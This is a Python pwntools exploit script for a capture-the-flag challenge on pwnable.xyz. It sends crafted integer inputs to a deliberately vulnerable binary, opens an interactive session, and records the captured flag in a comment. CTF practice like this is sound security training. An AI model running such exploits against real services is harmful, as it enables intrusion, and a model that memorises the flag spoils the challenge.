from pwn import *

HOST, PORT = "svc.pwnable.xyz", 30003
EXE = "./challenge"
gs = """
    break _start
    continue
"""

def start():
    if args.GDB:
        return gdb.debug(EXE, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE)

# ========== Exploit script here ==========
if __name__ == '__main__':
    elf = context.binary = ELF(EXE)
    io = start()

    a = 0xb500000000000000
    b = 0x0b000000
    io.sendline(f'{a//2} {a//2} -6'.encode())
    io.sendline(f'{b//2} {b//2} -5'.encode())
    io.sendline(b'aaaa')

    io.interactive()

# Flag: FLAG{u_cheater_used_a_debugger}